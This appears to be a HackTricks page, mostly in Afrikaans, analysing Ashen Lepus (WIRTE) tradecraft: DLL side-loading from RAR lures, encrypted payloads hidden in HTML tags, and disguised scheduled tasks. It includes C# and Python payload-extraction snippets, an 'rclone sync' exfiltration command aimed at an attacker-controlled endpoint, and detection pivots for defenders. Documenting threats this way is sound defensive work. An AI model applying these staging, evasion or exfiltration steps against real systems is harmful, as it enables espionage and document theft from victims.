# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig van handelsmetodes

Ashen Lepus (aka WIRTE) het 'n herhaalbare patroon geweaponiseer wat DLL sideloading, staged HTML payloads, en modular .NET backdoors aaneen koppel om volhoubaar binne Midde-Oosterse diplomatieke netwerke te bly. Die tegniek is herbruikbaar deur enige operator omdat dit staatmaak op:

- **Archive-based social engineering**: skadelose PDF's instrueer teikens om 'n RAR-argief van 'n lêerdelingswerf af te laai. Die argief bevat 'n realistiese dokumentkyker EXE, 'n kwaadwillige DLL vernoem na 'n vertroude biblioteek (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en 'n lok `Document.pdf`.
- **DLL search order abuse**: die slagoffer dubbelklik die EXE, Windows los die DLL-import vanaf die huidige gids op, en die kwaadwillige lader (AshenLoader) voer binne die vertroude proses uit terwyl die lok-PDF oopmaak om agterdog te voorkom.
- **Living-off-the-land staging**: elke later stadium (AshenStager → AshenOrchestrator → modules) word buite skyf gehou totdat dit nodig is, en afgelewer as geënkripteerde blobs weggesteek binne andersins onskadelike HTML-antwoorde.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-loads AshenLoader, wat host recon uitvoer, dit met AES-CTR enkripteer, en dit via POST in roterende parameters soos `token=`, `id=`, `q=`, of `auth=` na API-agtige paaie stuur (bv. `/api/v2/account`).
2. **HTML extraction**: die C2 verraai die volgende stadium slegs wanneer die kliënt-IP geo-lokaliseer word na die teikenstreek en die `User-Agent` by die implant pas, wat sandbokse frustreer. Wanneer die kontroles slaag bevat die HTTP-body 'n `<headerp>...</headerp>` blob met die Base64/AES-CTR-geënkripteerde AshenStager payload.
3. **Second sideload**: AshenStager word ontplooi saam met 'n ander wettige binêre wat `wtsapi32.dll` importeer. Die kwaadwillige kopie wat in die binêre ingespuit is, haal meer HTML en kerf hierdie keer `<article>...</article>` uit om AshenOrchestrator te herstel.
4. **AshenOrchestrator**: 'n modulêre .NET-beheerder wat 'n Base64 JSON-config dekodeer. Die config se `tg` en `au` velde word gekonkateer/gehasj in die AES-sleutel, wat `xrk` ontsleutel. Die resulterende bytes dien as 'n XOR-sleutel vir elke module-blob wat daarna opgehaal word.
5. **Module delivery**: elke module word beskryf deur HTML-opmerkings wat die parser herlei na 'n ewekansige tag, wat statiese reëls breek wat slegs na `<headerp>` of `<article>` kyk. Modules sluit in persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), en file exploration (`FE`).

### HTML houer-ontledingspatroon
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selfs as verdedigers 'n spesifieke element blokkeer of verwyder, hoef die operateur net die tag wat in die HTML comment aangedui word, te verander om die aflewering te hervat.

### Vinnige Uittreksel-hulp (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Onlangse HTML smuggling-navorsing (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-blokke in HTML-aanhangsels versteek is en via JavaScript tydens runtime gedekodeer word. Dieselfde truuk kan hergebruik word vir C2-antwoorde: stage versleutelde blobs binne ’n script-tag (of ander DOM-element) en dekodeer dit in-geheue voor AES/XOR, sodat die bladsy soos gewone HTML lyk. Talos wys ook gelaagde obfuskasie (identifier hernoeming plus Base64/Caesar/AES) binne script-tags, wat netjies kaart na HTML-staged C2 blobs.

## Recent Variant Notes (2024-2025)

- Check Point waargeneem WIRTE-kampanjes in 2024 wat steeds op archive-based sideloading gesteun het maar `propsys.dll` (stagerx64) as die eerste fase gebruik het. Die stager dekodeer die volgende payload met Base64 + XOR (sleutel `53`), stuur HTTP-versoeke met ’n hardgekodeerde `User-Agent`, en onttrek versleutelde blobs ingebed tussen HTML-tags. In een tak is die fase herbou vanaf ’n lang lys ingebedde IP-stringe wat gedekodeer is via `RtlIpv4StringToAddressA`, en dan aanmekaar geplak in die payload-bytes.
- OWN-CERT het vroeër WIRTE-gereedskap gedokumenteer waar die side-loaded `wtsapi32.dll` dropper strings beskerm het met Base64 + TEA en die DLL-naam self as die dekripsiesleutel gebruik het, en daarna XOR/Base64-obfuskasie op host-identifikasie-data toegepas het voordat dit na die C2 gestuur is.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: huidige loaders embed 256-bit sleutels plus nonces (bv. `{9a 20 51 98 ...}`) en voeg opsioneel ’n XOR-laag by deur strings soos `msasn1.dll` voor/na dekripsie te gebruik.
- **Key material variations**: vroeër loaders het Base64 + TEA gebruik om ingebedde strings te beskerm, met die dekripsiesleutel afgelei van die kwaadwillige DLL-naam (bv. `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: staging-servers word per tool geskei, gehost oor verskillende ASNs, en soms deur legitiem-lykende subdomeine voorgehou, sodat die verbranding van een fase nie die res blootstel nie.
- **Recon smuggling**: opgesomde data sluit nou Program Files-lyste in om hoë-waarde apps te identifiseer en word altyd versleuteld voordat dit die gasheer verlaat.
- **URI churn**: navraagparameter en REST-paaie roteer tussen kampanjes (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose detections ongeldig maak.
- **User-Agent pinning + safe redirects**: C2-infrastruktuur antwoord slegs op presiese UA-stringe en andersins herlei na skynbaar onskadelike nuus-/gesondheidswebwerwe om in te meng.
- **Gated delivery**: servers is geo-afgesper en antwoord slegs aan regte implants. Nie-goedgekeurde kliënte ontvang onverdagte HTML.

## Persistence & Execution Loop

AshenStager drop skeduleertake wat voorskyn kom as Windows onderhoudsjobs en via `svchost.exe` uitgevoer word, bv.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Hierdie take herlanceer die sideloading-ketting tydens boot of op intervalles, wat verseker dat AshenOrchestrator vars modules kan opvra sonder om weer op die skyf te skryf.

## Using Benign Sync Clients for Exfiltration

Operators stage diplomatieke dokumente binne `C:\Users\Public` (wereld-beskikbaar en nie-verdag) deur ’n toegewyde module, en laai dan die legitieme [Rclone](https://rclone.org/) binary af om daardie gids met aanvaller-opberging te sinkroniseer. Unit42 dui aan dat dit die eerste keer is dat hierdie actor Rclone vir exfiltration gebruik is, wat ooreenstem met die breër neiging om legitieme sync-gereedskap te misbruik om in normale verkeer te meng:

1. **Stage**: kopieer/vergam doel-lêers na `C:\Users\Public\{campaign}\`.
2. **Configure**: stuur ’n Rclone config wat wys na ’n aanvaller-beheerde HTTPS-endpoint (bv. `api.technology-system[.]com`).
3. **Sync**: hardloop `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` sodat die verkeer soos normale cloud-backups voorkom.

Omdat Rclone wyd gebruik word vir legitime backup-workflows, moet verdedigers fokus op anomalous uitvoerings (nuwe binaries, vreemde remotes, of skielike sinkronisering van `C:\Users\Public`).

## Detection Pivots

- Alert op **signed processes** wat onverwags DLLs van user-writable paths laai (Procmon filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name oorvleuel met `netutils`, `srvcli`, `dwampi`, of `wtsapi32`.
- Inspekteer verdagte HTTPS-antwoorde vir **groot Base64-blobs ingebed binne ongewone tags** of beskerm deur `<!-- TAG: <xyz> -->` kommentaar.
- Brei HTML-hunting uit na **Base64-stringe binne `<script>`-blokke** (HTML smuggling-styl staging) wat via JavaScript voor AES/XOR-verwerking gedekodeer word.
- Jaag na **skeduleertake** wat `svchost.exe` met nie-service-argumente uitvoer of terugwys na dropper-gidse.
- Volg **C2-redirects** wat slegs payloads teruggee vir presiese `User-Agent`-stringe en anders na legitieme nuus-/gesondheidsdomeine bounce.
- Monitor vir **Rclone** binaries wat buite IT-beheerde liggings verskyn, nuwe `rclone.conf`-lêers, of sinkroniseringsjobs wat staging-gidse soos `C:\Users\Public` trek.

## Verwysings

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
